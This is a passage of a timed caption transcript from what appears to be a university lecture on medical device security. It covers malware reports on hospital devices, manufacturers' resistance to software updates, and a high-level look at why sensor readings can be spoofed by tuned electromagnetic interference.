            <slice>
              <time_slice>29:30</time_slice>
              <text_slice>on their laptops in hospitals.</text_slice>
            </slice>
            <slice>
              <time_slice>29:32</time_slice>
              <text_slice>Hopefully not on the
ventilator, but most likely</text_slice>
            </slice>
            <slice>
              <time_slice>29:35</time_slice>
              <text_slice>on their local computer.</text_slice>
            </slice>
            <slice>
              <time_slice>29:39</time_slice>
              <text_slice>So other fun things
you can do is</text_slice>
            </slice>
            <slice>
              <time_slice>29:42</time_slice>
              <text_slice>you can go search the
MAUDE database for keywords</text_slice>
            </slice>
            <slice>
              <time_slice>29:45</time_slice>
              <text_slice>like computer virus and
see what's in there.</text_slice>
            </slice>
            <slice>
              <time_slice>29:48</time_slice>
              <text_slice>And these are all
narratives submitted</text_slice>
            </slice>
            <slice>
              <time_slice>29:49</time_slice>
              <text_slice>by hospitals and manufacturers.</text_slice>
            </slice>
            <slice>
              <time_slice>29:51</time_slice>
              <text_slice>One of the more
interesting ones is</text_slice>
            </slice>
            <slice>
              <time_slice>29:53</time_slice>
              <text_slice>something called a compounder.</text_slice>
            </slice>
            <slice>
              <time_slice>29:55</time_slice>
              <text_slice>So I have one of
these in my lab.</text_slice>
            </slice>
            <slice>
              <time_slice>29:57</time_slice>
              <text_slice>It's kind of hard to get.</text_slice>
            </slice>
            <slice>
              <time_slice>29:58</time_slice>
              <text_slice>But it makes liquid drugs.</text_slice>
            </slice>
            <slice>
              <time_slice>30:00</time_slice>
              <text_slice>So it has I think on the
order of 16 ports on the top,</text_slice>
            </slice>
            <slice>
              <time_slice>30:04</time_slice>
              <text_slice>where you can have
the little serums,</text_slice>
            </slice>
            <slice>
              <time_slice>30:06</time_slice>
              <text_slice>and then it deposits
it into a saline bag.</text_slice>
            </slice>
            <slice>
              <time_slice>30:09</time_slice>
              <text_slice>And then you can use IV
delivery to deliver it directly</text_slice>
            </slice>
            <slice>
              <time_slice>30:11</time_slice>
              <text_slice>to your veins.</text_slice>
            </slice>
            <slice>
              <time_slice>30:13</time_slice>
              <text_slice>So many hospitals will
have these for custom, just</text_slice>
            </slice>
            <slice>
              <time_slice>30:16</time_slice>
              <text_slice>in time drug delivery,
special cocktails of drugs</text_slice>
            </slice>
            <slice>
              <time_slice>30:19</time_slice>
              <text_slice>for patients.</text_slice>
            </slice>
            <slice>
              <time_slice>30:20</time_slice>
              <text_slice>And what was
interesting is here,</text_slice>
            </slice>
            <slice>
              <time_slice>30:22</time_slice>
              <text_slice>there was a report
that the compounder</text_slice>
            </slice>
            <slice>
              <time_slice>30:23</time_slice>
              <text_slice>was infected with a virus.</text_slice>
            </slice>
            <slice>
              <time_slice>30:25</time_slice>
              <text_slice>OK?</text_slice>
            </slice>
            <slice>
              <time_slice>30:26</time_slice>
              <text_slice>So we bought that
compounder, and we found</text_slice>
            </slice>
            <slice>
              <time_slice>30:28</time_slice>
              <text_slice>it runs Windows XP embedded.</text_slice>
            </slice>
            <slice>
              <time_slice>30:30</time_slice>
              <text_slice>Surprise.</text_slice>
            </slice>
            <slice>
              <time_slice>30:31</time_slice>
              <text_slice>And so it was
vulnerable to malware,</text_slice>
            </slice>
            <slice>
              <time_slice>30:34</time_slice>
              <text_slice>all the malware that
any other Windows XP</text_slice>
            </slice>
            <slice>
              <time_slice>30:35</time_slice>
              <text_slice>box would be vulnerable to.</text_slice>
            </slice>
            <slice>
              <time_slice>30:37</time_slice>
              <text_slice>But what was a little
bit surprising to me</text_slice>
            </slice>
            <slice>
              <time_slice>30:39</time_slice>
              <text_slice>was manufacturer
response at the time.</text_slice>
            </slice>
            <slice>
              <time_slice>30:41</time_slice>
              <text_slice>I hope they changed their
tune, but at the time</text_slice>
            </slice>
            <slice>
              <time_slice>30:43</time_slice>
              <text_slice>they said, "Well,
we do not regularly</text_slice>
            </slice>
            <slice>
              <time_slice>30:45</time_slice>
              <text_slice>install operating system
updates or patches."</text_slice>
            </slice>
            <slice>
              <time_slice>30:49</time_slice>
              <text_slice>This struck me as whoa, what?</text_slice>
            </slice>
            <slice>
              <time_slice>30:51</time_slice>
              <text_slice>What do you mean?</text_slice>
            </slice>
            <slice>
              <time_slice>30:52</time_slice>
              <text_slice>I said maybe they
had a bit flip.</text_slice>
            </slice>
            <slice>
              <time_slice>30:55</time_slice>
              <text_slice>But there's a huge
misunderstanding</text_slice>
            </slice>
            <slice>
              <time_slice>30:58</time_slice>
              <text_slice>about expectations
of software updates.</text_slice>
            </slice>
            <slice>
              <time_slice>31:01</time_slice>
              <text_slice>Let me be clear.</text_slice>
            </slice>
            <slice>
              <time_slice>31:02</time_slice>
              <text_slice>FDA expects manufacturers to
keep the software up to date.</text_slice>
            </slice>
            <slice>
              <time_slice>31:07</time_slice>
              <text_slice>But many manufacturers
will claim</text_slice>
            </slice>
            <slice>
              <time_slice>31:09</time_slice>
              <text_slice>that they are not able to do
updates because of some FDA</text_slice>
            </slice>
            <slice>
              <time_slice>31:13</time_slice>
              <text_slice>nonexistent rules.</text_slice>
            </slice>
            <slice>
              <time_slice>31:14</time_slice>
              <text_slice>So if you ever run into a
medical device manufacturer,</text_slice>
            </slice>
            <slice>
              <time_slice>31:16</time_slice>
              <text_slice>and they claim that the
FDA rules prevent them</text_slice>
            </slice>
            <slice>
              <time_slice>31:19</time_slice>
              <text_slice>from doing software
updates, just</text_slice>
            </slice>
            <slice>
              <time_slice>31:20</time_slice>
              <text_slice>tell them, no,
actually that's untrue.</text_slice>
            </slice>
            <slice>
              <time_slice>31:23</time_slice>
              <text_slice>And Professor Freeman
created a poster for this.</text_slice>
            </slice>
            <slice>
              <time_slice>31:26</time_slice>
              <text_slice>So here we go.</text_slice>
            </slice>
            <slice>
              <time_slice>31:27</time_slice>
              <text_slice>"Homework prevents me
from passing class,</text_slice>
            </slice>
            <slice>
              <time_slice>31:29</time_slice>
              <text_slice>eHarmony prevents me
from getting dates,</text_slice>
            </slice>
            <slice>
              <time_slice>31:31</time_slice>
              <text_slice>and yes, FDA rules
prevent software updates.</text_slice>
            </slice>
            <slice>
              <time_slice>31:33</time_slice>
              <text_slice>Yeah, right.</text_slice>
            </slice>
            <slice>
              <time_slice>31:34</time_slice>
              <text_slice>Bull."</text_slice>
            </slice>
            <slice>
              <time_slice>31:36</time_slice>
              <text_slice>So it is true that issuing a
software update takes effort.</text_slice>
            </slice>
            <slice>
              <time_slice>31:40</time_slice>
              <text_slice>It takes engineering time.</text_slice>
            </slice>
            <slice>
              <time_slice>31:41</time_slice>
              <text_slice>It's not a simple process.</text_slice>
            </slice>
            <slice>
              <time_slice>31:43</time_slice>
              <text_slice>It's not like-- I don't know
what course it's called these</text_slice>
            </slice>
            <slice>
              <time_slice>31:45</time_slice>
              <text_slice>days, 6.170, what it's
become-- but it's not as simple</text_slice>
            </slice>
            <slice>
              <time_slice>31:49</time_slice>
              <text_slice>as typing "make" and then
submit to the auto-grader.</text_slice>
            </slice>
            <slice>
              <time_slice>31:52</time_slice>
              <text_slice>There's a huge amount of
verification and validation</text_slice>
            </slice>
            <slice>
              <time_slice>31:54</time_slice>
              <text_slice>that goes on.</text_slice>
            </slice>
            <slice>
              <time_slice>31:55</time_slice>
              <text_slice>But that's what
you're expected to do</text_slice>
            </slice>
            <slice>
              <time_slice>31:57</time_slice>
              <text_slice>if you're in the medical
device manufacturing game.</text_slice>
            </slice>
            <slice>
              <time_slice>31:59</time_slice>
              <text_slice>If you're in that industry,
that's the expectation.</text_slice>
            </slice>
            <slice>
              <time_slice>32:05</time_slice>
              <text_slice>So a question that
often comes up</text_slice>
            </slice>
            <slice>
              <time_slice>32:07</time_slice>
              <text_slice>is, do we need to
worry about this?</text_slice>
            </slice>
            <slice>
              <time_slice>32:10</time_slice>
              <text_slice>And are there any intentional
malicious malfunctions?</text_slice>
            </slice>
            <slice>
              <time_slice>32:12</time_slice>
              <text_slice>How significant are these?</text_slice>
            </slice>
            <slice>
              <time_slice>32:14</time_slice>
              <text_slice>And the good news is, I'm not
aware of any specific instance</text_slice>
            </slice>
            <slice>
              <time_slice>32:18</time_slice>
              <text_slice>where there's been
a targeted attack,</text_slice>
            </slice>
            <slice>
              <time_slice>32:19</time_slice>
              <text_slice>and I hope none ever happens.</text_slice>
            </slice>
            <slice>
              <time_slice>32:21</time_slice>
              <text_slice>But I think it'd be
foolish to assume</text_slice>
            </slice>
            <slice>
              <time_slice>32:23</time_slice>
              <text_slice>that bad people don't exist.</text_slice>
            </slice>
            <slice>
              <time_slice>32:26</time_slice>
              <text_slice>So if you look back in
history, in 1982, actually,</text_slice>
            </slice>
            <slice>
              <time_slice>32:29</time_slice>
              <text_slice>there was an incident in
Chicago where somebody</text_slice>
            </slice>
            <slice>
              <time_slice>32:31</time_slice>
              <text_slice>deliberately tampered with
extra-strength Tylenol</text_slice>
            </slice>
            <slice>
              <time_slice>32:34</time_slice>
              <text_slice>on the shelves of pharmacies
and inserted cyanide.</text_slice>
            </slice>
            <slice>
              <time_slice>32:38</time_slice>
              <text_slice>A number of people
ingested it and died.</text_slice>
            </slice>
            <slice>
              <time_slice>32:41</time_slice>
              <text_slice>A short time later,
at the funeral,</text_slice>
            </slice>
            <slice>
              <time_slice>32:42</time_slice>
              <text_slice>additional members of
family used the same bottle.</text_slice>
            </slice>
            <slice>
              <time_slice>32:44</time_slice>
              <text_slice>They also died.</text_slice>
            </slice>
            <slice>
              <time_slice>32:46</time_slice>
              <text_slice>Within days, the US
had pulled Tylenol</text_slice>
            </slice>
            <slice>
              <time_slice>32:50</time_slice>
              <text_slice>from all the shelves
in the United States.</text_slice>
            </slice>
            <slice>
              <time_slice>32:52</time_slice>
              <text_slice>You could not find Tylenol
in the United States.</text_slice>
            </slice>
            <slice>
              <time_slice>32:55</time_slice>
              <text_slice>And within one year, Congress
had passed new legislation</text_slice>
            </slice>
            <slice>
              <time_slice>32:58</time_slice>
              <text_slice>requiring tamper-evident
packaging and physical security</text_slice>
            </slice>
            <slice>
              <time_slice>33:01</time_slice>
              <text_slice>of over-the-counter drugs.</text_slice>
            </slice>
            <slice>
              <time_slice>33:03</time_slice>
              <text_slice>This incident is the reason
when you open up your medicine,</text_slice>
            </slice>
            <slice>
              <time_slice>33:05</time_slice>
              <text_slice>you see a little metal foil.</text_slice>
            </slice>
            <slice>
              <time_slice>33:07</time_slice>
              <text_slice>So we know bad people exist.</text_slice>
            </slice>
            <slice>
              <time_slice>33:10</time_slice>
              <text_slice>The cases that we are aware
of are more about tomfoolery,</text_slice>
            </slice>
            <slice>
              <time_slice>33:14</time_slice>
              <text_slice>but still dangerous.</text_slice>
            </slice>
            <slice>
              <time_slice>33:15</time_slice>
              <text_slice>So this woman said she had
one of the worst seizure she's</text_slice>
            </slice>
            <slice>
              <time_slice>33:18</time_slice>
              <text_slice>ever experienced
when somebody decided</text_slice>
            </slice>
            <slice>
              <time_slice>33:20</time_slice>
              <text_slice>to post flashing animations
on an epilepsy support group</text_slice>
            </slice>
            <slice>
              <time_slice>33:22</time_slice>
              <text_slice>website.</text_slice>
            </slice>
            <slice>
              <time_slice>33:24</time_slice>
              <text_slice>So quite malicious.</text_slice>
            </slice>
            <slice>
              <time_slice>33:25</time_slice>
              <text_slice>It was probably someone who
didn't realize the ramification</text_slice>
            </slice>
            <slice>
              <time_slice>33:27</time_slice>
              <text_slice>of their actions,
because you can actually</text_slice>
            </slice>
            <slice>
              <time_slice>33:30</time_slice>
              <text_slice>severely harm a patient who's
sensitive to those kinds</text_slice>
            </slice>
            <slice>
              <time_slice>33:34</time_slice>
              <text_slice>of things.</text_slice>
            </slice>
            <slice>
              <time_slice>33:35</time_slice>
              <text_slice>But again, bad people do exist.</text_slice>
            </slice>
            <slice>
              <time_slice>33:37</time_slice>
              <text_slice>So one of the problems
with the culture gap</text_slice>
            </slice>
            <slice>
              <time_slice>33:41</time_slice>
              <text_slice>is that much of medical
device manufacturing</text_slice>
            </slice>
            <slice>
              <time_slice>33:43</time_slice>
              <text_slice>thinks statistically,
and they think</text_slice>
            </slice>
            <slice>
              <time_slice>33:46</time_slice>
              <text_slice>about past performance
of a device predicting</text_slice>
            </slice>
            <slice>
              <time_slice>33:48</time_slice>
              <text_slice>future performance.</text_slice>
            </slice>
            <slice>
              <time_slice>33:50</time_slice>
              <text_slice>So in the security world,
we know that actually,</text_slice>
            </slice>
            <slice>
              <time_slice>33:52</time_slice>
              <text_slice>if you see no security problems,
that might be because there</text_slice>
            </slice>
            <slice>
              <time_slice>33:55</time_slice>
              <text_slice>are a bunch more to come soon.</text_slice>
            </slice>
            <slice>
              <time_slice>33:56</time_slice>
              <text_slice>So if you take a look at the
Mac, for instance, right?</text_slice>
            </slice>
            <slice>
              <time_slice>33:59</time_slice>
              <text_slice>Before two years ago, basically
no malware was on the Mac.</text_slice>
            </slice>
            <slice>
              <time_slice>34:03</time_slice>
              <text_slice>But then one night over
half a million Macs</text_slice>
            </slice>
            <slice>
              <time_slice>34:05</time_slice>
              <text_slice>got infected by Flashback.</text_slice>
            </slice>
            <slice>
              <time_slice>34:07</time_slice>
              <text_slice>So one of the problems is
bridging that culture gap.</text_slice>
            </slice>
            <slice>
              <time_slice>34:10</time_slice>
              <text_slice>To move from,
well, there haven't</text_slice>
            </slice>
            <slice>
              <time_slice>34:12</time_slice>
              <text_slice>been any reported
problems yet, so we</text_slice>
            </slice>
            <slice>
              <time_slice>34:13</time_slice>
              <text_slice>don't need to worry about it,
to explaining more about how</text_slice>
            </slice>
            <slice>
              <time_slice>34:17</time_slice>
              <text_slice>to fit security into
the risk management</text_slice>
            </slice>
            <slice>
              <time_slice>34:19</time_slice>
              <text_slice>thinking of medical
device manufacturing.</text_slice>
            </slice>
            <slice>
              <time_slice>34:22</time_slice>
              <text_slice>So hopefully we can
avoid this, and keep</text_slice>
            </slice>
            <slice>
              <time_slice>34:24</time_slice>
              <text_slice>that to be on the Weekly World
News, but it could happen.</text_slice>
            </slice>
            <slice>
              <time_slice>34:29</time_slice>
              <text_slice>So trying to bring
that analogy home now.</text_slice>
            </slice>
            <slice>
              <time_slice>34:32</time_slice>
              <text_slice>Before we get into a little
bit more on the solutions here,</text_slice>
            </slice>
            <slice>
              <time_slice>34:35</time_slice>
              <text_slice>is that way back when,
there was a lot of denial</text_slice>
            </slice>
            <slice>
              <time_slice>34:39</time_slice>
              <text_slice>that hand washing was a problem.</text_slice>
            </slice>
            <slice>
              <time_slice>34:40</time_slice>
              <text_slice>But there was a real
reason for that.</text_slice>
            </slice>
            <slice>
              <time_slice>34:42</time_slice>
              <text_slice>In the 1800s, running
water was not exactly</text_slice>
            </slice>
            <slice>
              <time_slice>34:45</time_slice>
              <text_slice>common in hospitals.</text_slice>
            </slice>
            <slice>
              <time_slice>34:47</time_slice>
              <text_slice>Latex gloves did not exist yet.</text_slice>
            </slice>
            <slice>
              <time_slice>34:49</time_slice>
              <text_slice>So to ask someone to merely wash
their hands for each procedure</text_slice>
            </slice>
            <slice>
              <time_slice>34:53</time_slice>
              <text_slice>was actually a
pretty tall order.</text_slice>
            </slice>
            <slice>
              <time_slice>34:55</time_slice>
              <text_slice>And the same thing can be
said of security today,</text_slice>
            </slice>
            <slice>
              <time_slice>34:57</time_slice>
              <text_slice>in almost any context.</text_slice>
            </slice>
            <slice>
              <time_slice>34:59</time_slice>
              <text_slice>There's no magic pixie
dust you can sprinkle.</text_slice>
            </slice>
            <slice>
              <time_slice>35:01</time_slice>
              <text_slice>There are no magic latex
gloves you can put to somehow</text_slice>
            </slice>
            <slice>
              <time_slice>35:05</time_slice>
              <text_slice>magically add security.</text_slice>
            </slice>
            <slice>
              <time_slice>35:06</time_slice>
              <text_slice>So when you ask a
manufacturer or clinician</text_slice>
            </slice>
            <slice>
              <time_slice>35:09</time_slice>
              <text_slice>to, say, keep your
device secure,</text_slice>
            </slice>
            <slice>
              <time_slice>35:11</time_slice>
              <text_slice>it's a pretty tall order.</text_slice>
            </slice>
            <slice>
              <time_slice>35:12</time_slice>
              <text_slice>So it's going to take
some time, I think.</text_slice>
            </slice>
            <slice>
              <time_slice>35:14</time_slice>
              <text_slice>But if they were
alive today, they</text_slice>
            </slice>
            <slice>
              <time_slice>35:15</time_slice>
              <text_slice>might be saying medical
devices should be secure,</text_slice>
            </slice>
            <slice>
              <time_slice>35:17</time_slice>
              <text_slice>and doctors are gentleman
and therefore their computers</text_slice>
            </slice>
            <slice>
              <time_slice>35:20</time_slice>
              <text_slice>are secure.</text_slice>
            </slice>
            <slice>
              <time_slice>35:21</time_slice>
              <text_slice>But I'm optimistic we're
going to get there,</text_slice>
            </slice>
            <slice>
              <time_slice>35:24</time_slice>
              <text_slice>because most manufacturers
I talk to now realize it's</text_slice>
            </slice>
            <slice>
              <time_slice>35:27</time_slice>
              <text_slice>a real problem.</text_slice>
            </slice>
            <slice>
              <time_slice>35:28</time_slice>
              <text_slice>They're just not necessarily
sure on what to do next.</text_slice>
            </slice>
            <slice>
              <time_slice>35:30</time_slice>
              <text_slice>So maybe they'll be hiring
you people for the future,</text_slice>
            </slice>
            <slice>
              <time_slice>35:33</time_slice>
              <text_slice>to help them solve
these security problems.</text_slice>
            </slice>
            <slice>
              <time_slice>35:36</time_slice>
              <text_slice>But what it all
boils down to is it's</text_slice>
            </slice>
            <slice>
              <time_slice>35:38</time_slice>
              <text_slice>very difficult to add
security on after the fact.</text_slice>
            </slice>
            <slice>
              <time_slice>35:40</time_slice>
              <text_slice>Bolting it on is
very challenging.</text_slice>
            </slice>
            <slice>
              <time_slice>35:42</time_slice>
              <text_slice>It's possible in some
cases, but it's really hard,</text_slice>
            </slice>
            <slice>
              <time_slice>35:45</time_slice>
              <text_slice>and often very expensive.</text_slice>
            </slice>
            <slice>
              <time_slice>35:46</time_slice>
              <text_slice>And you've really got to
design it in from the beginning</text_slice>
            </slice>
            <slice>
              <time_slice>35:48</time_slice>
              <text_slice>to get it right.</text_slice>
            </slice>
            <slice>
              <time_slice>35:49</time_slice>
              <text_slice>So FDA is expecting
manufacturers</text_slice>
            </slice>
            <slice>
              <time_slice>35:51</time_slice>
              <text_slice>to get it right
when they're still</text_slice>
            </slice>
            <slice>
              <time_slice>35:53</time_slice>
              <text_slice>working with pen and
paper, on whiteboards,</text_slice>
            </slice>
            <slice>
              <time_slice>35:55</time_slice>
              <text_slice>before they've
actually manufactured</text_slice>
            </slice>
            <slice>
              <time_slice>35:56</time_slice>
              <text_slice>the medical device.</text_slice>
            </slice>
            <slice>
              <time_slice>35:59</time_slice>
              <text_slice>So how are we doing on time?</text_slice>
            </slice>
            <slice>
              <time_slice>36:04</time_slice>
              <text_slice>Oh, quite a bit?</text_slice>
            </slice>
            <slice>
              <time_slice>36:06</time_slice>
              <text_slice>40 minutes, awesome.</text_slice>
            </slice>
            <slice>
              <time_slice>36:07</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>36:09</time_slice>
              <text_slice>I'm going faster than I thought.</text_slice>
            </slice>
            <slice>
              <time_slice>36:10</time_slice>
              <text_slice>Sorry if you're taking notes.</text_slice>
            </slice>
            <slice>
              <time_slice>36:12</time_slice>
              <text_slice>I'll talk slower now.</text_slice>
            </slice>
            <slice>
              <time_slice>36:16</time_slice>
              <text_slice>I want to talk a little
bit about technology</text_slice>
            </slice>
            <slice>
              <time_slice>36:18</time_slice>
              <text_slice>to make a medical devices
actually more trustworthy.</text_slice>
            </slice>
            <slice>
              <time_slice>36:22</time_slice>
              <text_slice>So I'm going to try to
blow your mind, all right?</text_slice>
            </slice>
            <slice>
              <time_slice>36:25</time_slice>
              <text_slice>So why do you trust the sensor
on, let's say, your smartphone?</text_slice>
            </slice>
            <slice>
              <time_slice>36:32</time_slice>
              <text_slice>You've got a smartphone there.</text_slice>
            </slice>
            <slice>
              <time_slice>36:33</time_slice>
              <text_slice>Do you know what sensors
are on that smartphone?</text_slice>
            </slice>
            <slice>
              <time_slice>36:38</time_slice>
              <text_slice>AUDIENCE: GPS.</text_slice>
            </slice>
            <slice>
              <time_slice>36:39</time_slice>
              <text_slice>PROFESSOR: There's GPS?</text_slice>
            </slice>
            <slice>
              <time_slice>36:42</time_slice>
              <text_slice>Accelerometer, I heard.</text_slice>
            </slice>
            <slice>
              <time_slice>36:44</time_slice>
              <text_slice>Any other thoughts?</text_slice>
            </slice>
            <slice>
              <time_slice>36:45</time_slice>
              <text_slice>What else would we
find on a phone?</text_slice>
            </slice>
            <slice>
              <time_slice>36:47</time_slice>
              <text_slice>AUDIENCE: Compass.</text_slice>
            </slice>
            <slice>
              <time_slice>36:48</time_slice>
              <text_slice>PROFESSOR: Compass?</text_slice>
            </slice>
            <slice>
              <time_slice>36:49</time_slice>
              <text_slice>Light?</text_slice>
            </slice>
            <slice>
              <time_slice>36:50</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>36:51</time_slice>
              <text_slice>PROFESSOR:
Electromagnetic field?</text_slice>
            </slice>
            <slice>
              <time_slice>36:54</time_slice>
              <text_slice>Everything's
temperature-sensitive.</text_slice>
            </slice>
            <slice>
              <time_slice>36:59</time_slice>
              <text_slice>Camera's technically
got a CCD sensor.</text_slice>
            </slice>
            <slice>
              <time_slice>37:01</time_slice>
              <text_slice>So there's sensors
all over the place.</text_slice>
            </slice>
            <slice>
              <time_slice>37:02</time_slice>
              <text_slice>Medical devices
have sensors, too.</text_slice>
            </slice>
            <slice>
              <time_slice>37:04</time_slice>
              <text_slice>Now, why do you trust
what the sensor's</text_slice>
            </slice>
            <slice>
              <time_slice>37:06</time_slice>
              <text_slice>telling your processor?</text_slice>
            </slice>
            <slice>
              <time_slice>37:07</time_slice>
              <text_slice>If you write software
and your sensor</text_slice>
            </slice>
            <slice>
              <time_slice>37:10</time_slice>
              <text_slice>tells you it's 77 degrees
today, or 25 Celsius,</text_slice>
            </slice>
            <slice>
              <time_slice>37:15</time_slice>
              <text_slice>why do you believe that?</text_slice>
            </slice>
            <slice>
              <time_slice>37:17</time_slice>
              <text_slice>So at least in my lab, we
do a lot of work on sensors.</text_slice>
            </slice>
            <slice>
              <time_slice>37:20</time_slice>
              <text_slice>So I try to pass
this one around.</text_slice>
            </slice>
            <slice>
              <time_slice>37:22</time_slice>
              <text_slice>This is a batteryless sensor.</text_slice>
            </slice>
            <slice>
              <time_slice>37:25</time_slice>
              <text_slice>It's got an MSP430
microcontroller.</text_slice>
            </slice>
            <slice>
              <time_slice>37:29</time_slice>
              <text_slice>But there's no battery.</text_slice>
            </slice>
            <slice>
              <time_slice>37:30</time_slice>
              <text_slice>It actually runs off a
10 microfarad capacitor,</text_slice>
            </slice>
            <slice>
              <time_slice>37:32</time_slice>
              <text_slice>and it harvests RF energy to
power up that microprocessor.</text_slice>
            </slice>
            <slice>
              <time_slice>37:35</time_slice>
              <text_slice>I'll pass it up
this side, I guess.</text_slice>
            </slice>
            <slice>
              <time_slice>37:39</time_slice>
              <text_slice>And it's got all the
fun little things</text_slice>
            </slice>
            <slice>
              <time_slice>37:41</time_slice>
              <text_slice>like a 3D accelerometer,
temperature sensors, light,</text_slice>
            </slice>
            <slice>
              <time_slice>37:43</time_slice>
              <text_slice>all that fun stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>37:45</time_slice>
              <text_slice>But it's really
hard to power up.</text_slice>
            </slice>
            <slice>
              <time_slice>37:48</time_slice>
              <text_slice>But again, how do you
trust what's actually</text_slice>
            </slice>
            <slice>
              <time_slice>37:49</time_slice>
              <text_slice>coming into that sensor?</text_slice>
            </slice>
            <slice>
              <time_slice>37:51</time_slice>
              <text_slice>Something's translating it from
all these physical phenomena</text_slice>
            </slice>
            <slice>
              <time_slice>37:54</time_slice>
              <text_slice>to little electrical pulses.</text_slice>
            </slice>
            <slice>
              <time_slice>37:56</time_slice>
              <text_slice>So one thing I want
to highlight is</text_slice>
            </slice>
            <slice>
              <time_slice>38:00</time_slice>
              <text_slice>why you might not
want to trust what's</text_slice>
            </slice>
            <slice>
              <time_slice>38:02</time_slice>
              <text_slice>coming out of that sensor.</text_slice>
            </slice>
            <slice>
              <time_slice>38:03</time_slice>
              <text_slice>So this is work from one of
my post-docs, Denis Foo Kune</text_slice>
            </slice>
            <slice>
              <time_slice>38:05</time_slice>
              <text_slice>here, who's kiteboarding
on Lake Michigan.</text_slice>
            </slice>
            <slice>
              <time_slice>38:08</time_slice>
              <text_slice>But in his other
spare time, he likes</text_slice>
            </slice>
            <slice>
              <time_slice>38:09</time_slice>
              <text_slice>to interfere with sensors.</text_slice>
            </slice>
            <slice>
              <time_slice>38:11</time_slice>
              <text_slice>So let me tell you about--
forget security for a moment,</text_slice>
            </slice>
            <slice>
              <time_slice>38:14</time_slice>
              <text_slice>to safety-- there was a
gentleman in 2009 who reported</text_slice>
            </slice>
            <slice>
              <time_slice>38:17</time_slice>
              <text_slice>that every time his cell
phone rang in his kitchen,</text_slice>
            </slice>
            <slice>
              <time_slice>38:19</time_slice>
              <text_slice>his oven turned on.</text_slice>
            </slice>
            <slice>
              <time_slice>38:21</time_slice>
              <text_slice>So you can go find this
in the New York Times.</text_slice>
            </slice>
            <slice>
              <time_slice>38:23</time_slice>
              <text_slice>It just happened to be that
that resonant frequency was just</text_slice>
            </slice>
            <slice>
              <time_slice>38:26</time_slice>
              <text_slice>perfect to get that ignition
to go off in the over.</text_slice>
            </slice>
            <slice>
              <time_slice>38:30</time_slice>
              <text_slice>So there's interference
all over the place.</text_slice>
            </slice>
            <slice>
              <time_slice>38:32</time_slice>
              <text_slice>It's a constant battle, because
we have different devices</text_slice>
            </slice>
            <slice>
              <time_slice>38:35</time_slice>
              <text_slice>speaking in the same spectrum.</text_slice>
            </slice>
            <slice>
              <time_slice>38:37</time_slice>
              <text_slice>But there are technologies
to reduce that interference.</text_slice>
            </slice>
            <slice>
              <time_slice>38:41</time_slice>
              <text_slice>The problem is, what happens
when the interference is</text_slice>
            </slice>
            <slice>
              <time_slice>38:44</time_slice>
              <text_slice>in the baseband?</text_slice>
            </slice>
            <slice>
              <time_slice>38:45</time_slice>
              <text_slice>I'm going to go a little bit
analog on you for moment.</text_slice>
            </slice>
            <slice>
              <time_slice>38:47</time_slice>
              <text_slice>So does 6.003 still exist?</text_slice>
            </slice>
            <slice>
              <time_slice>38:51</time_slice>
              <text_slice>It does?</text_slice>
            </slice>
            <slice>
              <time_slice>38:51</time_slice>
              <text_slice>OK, good.</text_slice>
            </slice>
            <slice>
              <time_slice>38:52</time_slice>
              <text_slice>So I encourage you all to
take it if you haven't.</text_slice>
            </slice>
            <slice>
              <time_slice>38:54</time_slice>
              <text_slice>It's one of the most awesome
courses for a CS person,</text_slice>
            </slice>
            <slice>
              <time_slice>38:56</time_slice>
              <text_slice>because you don't have to
go too deep into the circus.</text_slice>
            </slice>
            <slice>
              <time_slice>39:00</time_slice>
              <text_slice>So what was
interesting to me was,</text_slice>
            </slice>
            <slice>
              <time_slice>39:02</time_slice>
              <text_slice>I was trying to understand
why I should believe</text_slice>
            </slice>
            <slice>
              <time_slice>39:04</time_slice>
              <text_slice>what a sensor's telling me.</text_slice>
            </slice>
            <slice>
              <time_slice>39:05</time_slice>
              <text_slice>And so I started to look
at the block diagram.</text_slice>
            </slice>
            <slice>
              <time_slice>39:07</time_slice>
              <text_slice>And so for instance, if you've
got a Bluetooth headset,</text_slice>
            </slice>
            <slice>
              <time_slice>39:11</time_slice>
              <text_slice>what you're going to find
inside that Bluetooth headset is</text_slice>
            </slice>
            <slice>
              <time_slice>39:13</time_slice>
              <text_slice>a microphone, piece of wire,
an amplifier-- right, 003--</text_slice>
            </slice>
            <slice>
              <time_slice>39:18</time_slice>
              <text_slice>some more wire, or
some traces on a PCB.</text_slice>
            </slice>
            <slice>
              <time_slice>39:21</time_slice>
              <text_slice>It goes to an
analog/digital converter.</text_slice>
            </slice>
            <slice>
              <time_slice>39:22</time_slice>
              <text_slice>There might be some filtering.</text_slice>
            </slice>
            <slice>
              <time_slice>39:24</time_slice>
              <text_slice>And then it goes to
your microprocessor.</text_slice>
            </slice>
            <slice>
              <time_slice>39:27</time_slice>
              <text_slice>But there's all this other
stuff that gets in the way</text_slice>
            </slice>
            <slice>
              <time_slice>39:29</time_slice>
              <text_slice>before it gets to your software.</text_slice>
            </slice>
            <slice>
              <time_slice>39:31</time_slice>
              <text_slice>And for some reason,
your software</text_slice>
            </slice>
            <slice>
              <time_slice>39:33</time_slice>
              <text_slice>just believes anything
this wire says.</text_slice>
            </slice>
            <slice>
              <time_slice>39:36</time_slice>
              <text_slice>So what was interesting to
me was, well, you know what?</text_slice>
            </slice>
            <slice>
              <time_slice>39:39</time_slice>
              <text_slice>That piece of wire from the
microphone to the amplifier,</text_slice>
            </slice>
            <slice>
              <time_slice>39:41</time_slice>
              <text_slice>it has a length.</text_slice>
            </slice>
            <slice>
              <time_slice>39:42</time_slice>
              <text_slice>It also has a
resonant frequency.</text_slice>
            </slice>
            <slice>
              <time_slice>39:44</time_slice>
              <text_slice>So what would happen if somebody
generates custom electromagnet</text_slice>
            </slice>
            <slice>
              <time_slice>39:48</time_slice>
              <text_slice>interference that's
optimized to latch</text_slice>
            </slice>
            <slice>
              <time_slice>39:51</time_slice>
              <text_slice>onto that resonant frequency
of that piece of wire?</text_slice>
            </slice>
            <slice>
              <time_slice>39:53</time_slice>
              <text_slice>Well, it would go
into the amplifier</text_slice>
            </slice>
            <slice>
              <time_slice>39:55</time_slice>
              <text_slice>and it would get amplified.</text_slice>
            </slice>
            <slice>
              <time_slice>39:57</time_slice>
              <text_slice>And then it would go into
that analog/digital converter,</text_slice>
            </slice>
            <slice>
              <time_slice>39:59</time_slice>
              <text_slice>and you'd pass onto
the microprocessor.</text_slice>
            </slice>
            <slice>
              <time_slice>40:02</time_slice>
              <text_slice>One of the questions we had
